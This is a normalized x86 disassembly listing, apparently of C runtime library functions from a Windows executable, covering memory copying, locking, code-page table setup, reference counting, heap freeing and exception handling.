leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40cc90 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40caf4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40caf4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40caf4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40cc90 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40cc90 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40cc90 ]
sub_40ccfa
push 0xc
push r--data
call sub_40c6e8
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_40e5eb
push 0x1e
call sub_40e44b
push 0xff
call sub_40d965
push 0x18
call sub_40d893
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_40cdbd
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_40e438
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_40c72d
retn
push edi
call sub_40d805
pop ecx
push 0xfa0
push edi
call sub_40e338
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_40d805
pop ecx
call sub_40e438
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40cdb4
mov eax [ ebp - 0x1c ]
sub_40cdbd
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_40ccfa
test eax eax
pop ecx
jne r-xdata
push 0x11
call sub_40d91b
pop ecx
sub_40cdee
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
mov eax [ esi + 0xbc ]
xor ebp ebp
cmp eax ebp
push edi
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebp
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebp
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebp
je r-xdata
push 0x6
lea edi [ esi + 0x50 ]
pop ebx
cmp [ eax + 0xb4 ] ebp
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_40d805
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_40d805
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_40d805
push [ esi + 0xc0 ]
call sub_40d805
add esp 0x10
cmp [ eax ] ebp
jne r-xdata
cmp [ edi - 0x4 ] ebp
je r-xdata
mov eax [ edi ]
cmp eax ebp
je r-xdata
push eax
call sub_40e624
push [ edi ]
call sub_40d805
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebp
je r-xdata
add edi 0x10
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebp
je r-xdata
cmp [ eax ] ebp
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebp
je r-xdata
cmp [ eax ] ebp
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_40d805
pop ecx
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ eax ] ebp
jne r-xdata
push eax
call sub_40d805
pop ecx
push [ esi + 0xb0 ]
call sub_40d805
push [ esi + 0xbc ]
call sub_40d805
pop ecx
pop ecx
cmp [ eax ] ebp
jne r-xdata
push eax
call sub_40d805
push [ esi + 0xbc ]
call sub_40e7f4
pop ecx
pop ecx
push eax
call sub_40d805
pop ecx
push eax
call sub_40d805
push [ esi + 0xbc ]
call sub_40e7b4
pop ecx
pop ecx
sub_40cf2e
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ InterlockedIncrement@IAT ]
push esi
call edi
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ esi + 0xb8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xb4 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
push eax
call edi
push 0x6
lea ebx [ esi + 0x50 ]
pop ebp
push eax
call edi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec ebp
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
add eax 0xb4
push eax
call edi
pop edi
pop esi
pop ebp
pop ebx
retn
push eax
call edi
sub_40cfb4
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
retn
push ebx
push ebp
push edi
mov edi [ InterlockedDecrement@IAT ]
push esi
call edi
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ esi + 0xb8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xb4 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
push eax
call edi
push 0x6
lea ebx [ esi + 0x50 ]
pop ebp
push eax
call edi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec ebp
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
add eax 0xb4
push eax
call edi
pop edi
pop ebp
pop ebx
push eax
call edi
sub_40d040
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_40cf2e
test esi esi
pop ecx
je r-xdata
push esi
call sub_40cfb4
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_40cdee
pop ecx
sub_40d07e
push 0xc
push r--data
call sub_40c6e8
call sub_40c2c9
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_40cdbd
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_40d040
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d0e8
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_40c2c9
mov esi [ eax + 0x6c ]
mov eax esi
call sub_40c72d
retn
push 0x20
call sub_40d91b
pop ecx
sub_40d0f4
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40d123
push ebx
push ebp
push esi
push edi
mov ebp 0x101
mov esi eax
push ebp
xor edi edi
lea ebx [ esi + 0x1c ]
push edi
push ebx
call sub_40acf0
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
xor eax eax
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax rw-data
add esp 0xc
sub eax esi
mov cl [ eax + ebx ]
mov [ ebx ] cl
inc ebx
dec ebp
jne r-xdata
lea ecx [ esi + 0x11d ]
mov esi 0x100
mov dl [ ecx + eax ]
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
sub_40d178
push ebp
lea ebp [ esp - 0x49c ]
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x498 ] eax
push ebx
push edi
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
mov edi 0x100
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x80 ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x80 ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax + 0x398 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x76 ]
test al al
mov [ ebp + 0x398 ] 0x20
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x68 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push 0x1
push 0x0
call sub_40f04d
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp + 0x298 ]
push edi
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_40f472
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp + 0x198 ]
push edi
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_40f472
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x75 ]
mov edx [ ebp - 0x80 ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp + 0x498 ]
pop edi
xor ecx ebp
pop ebx
call sub_40acd2
add ebp 0x49c
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax + 0x298 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx + 0x398 ]
push 0x20
push edx
call sub_40acf0
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax + 0x198 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x68 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_40d302
push 0xc
push r--data
call sub_40c6e8
call sub_40c2c9
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_40cdbd
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d39d
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_40c72d
retn
push 0x20
call sub_40d91b
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_40d805
pop ecx
sub_40d3a6
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_40c2c9
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_40d07e
mov [ esi ] eax
mov eax esi
pop esi
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_40d302
mov [ esi + 0x4 ] eax
sub_40d428
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_40d3a6
cmp esi 0xfffffffe
mov [ rw-data ] ebx
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40d4a2
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_40d428
mov edi eax
xor esi esi
cmp edi esi
mov [ ebp + 0x8 ] edi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_40d123
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_40acf0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40acd2
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_40acf0
xor edx edx
inc edx
add esp 0xc
cmp [ ebp - 0x18 ] edx
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
jbe r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_40d0f4
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
or eax 0xffffffff
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_40d178
jmp r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_40d0f4
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_40d64d
push 0x14
push r--data
call sub_40c6e8
or [ ebp - 0x20 ] 0xffffffff
call sub_40c2c9
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_40d302
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_40d428
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_40d893
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_40c72d
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_40d4a2
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_40e438
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_40d805
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_40d805
pop ecx
push 0xd
call sub_40cdbd
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d7ae
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_40d805
pop ecx
sub_40d805
push 0xc
push r--data
call sub_40c6e8
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40c72d
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_40cdbd
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40f4b5
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_40e438
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40e3fd
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d85b
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_40f4e0
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_40d893
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push [ esp + 0xc ]
call sub_40ddc3
mov edi eax
test edi edi
pop ecx
jne r-xdata
sub_40d8d3
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push 0x0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_40fc8d
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_40d992
mov ecx [ esp + 0x4 ]
push esi
xor esi esi
cmp ecx esi
jne r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call sub_40e438
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40e979
add esp 0x14
push 0x16
pop eax
pop esi
retn
mov [ ecx ] eax
xor eax eax
pop esi
retn
sub_40d9c9
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
cmp [ rw-data ] esi
je r-xdata
call sub_40e438
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40e979
add esp 0x14
push 0x16
pop eax
pop esi
retn
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop esi
retn
sub_40da05
push 0xc
push r--data
call sub_40c6e8
push 0x8
call sub_40cdbd
pop ecx
and [ ebp - 0x4 ] 0x0
xor esi esi
inc esi
cmp [ rw-data ] esi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40dabe
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] esi
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_40c72d
retn
mov [ rw-data ] esi
push 0x8
call sub_40cce5
pop ecx
push [ ebp + 0x8 ]
call sub_40d965
push rw-data
mov eax rw-data
call sub_40d97a
pop ecx
push [ rw-data ]
call sub_40c105
mov edi eax
push [ rw-data ]
call sub_40c105
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
test edi edi
je r-xdata
push rw-data
mov eax rw-data
call sub_40d97a
pop ecx
sub [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x1c ] edi
jb r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call eax
jmp r-xdata
sub_40dae4
push ebp
lea ebp [ esp - 0x2a8 ]
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2a4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_40fe0e
test eax eax
je r-xdata
push 0xa
call sub_40e44b
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_40fe1b
pop ecx
push 0x3
call sub_40dad3
int3
mov [ ebp + 0x88 ] eax
mov [ ebp + 0x84 ] ecx
mov [ ebp + 0x80 ] edx
mov [ ebp + 0x7c ] ebx
mov [ ebp + 0x78 ] esi
mov [ ebp + 0x74 ] edi
mov [ ebp + 0xa0 ] ss
mov [ ebp + 0x94 ] cs
mov [ ebp + 0x70 ] ds
mov [ ebp + 0x6c ] es
mov [ ebp + 0x68 ] fs
mov [ ebp + 0x64 ] gs
pushfd
pop [ ebp + 0x98 ]
mov esi [ ebp + 0x2ac ]
lea eax [ ebp + 0x2ac ]
mov [ ebp + 0x9c ] eax
mov [ ebp - 0x28 ] 0x10001
mov [ ebp + 0x90 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp + 0x8c ] eax
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_40acf0
lea eax [ ebp - 0x80 ]
add esp 0xc
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
push 0x0
mov [ ebp - 0x80 ] 0x40000015
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x2c ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x30 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_40dbd8
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40dbf8
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_40acd2
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_40dc3d
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40dc3d
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_40dbf8
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40dced
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40dd0c
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_40dce4
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_40dced
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_40dd0f
mov ecx [ esp + 0x4 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
je r-xdata
call sub_40e438
push 0x16
pop esi
mov [ eax ] esi
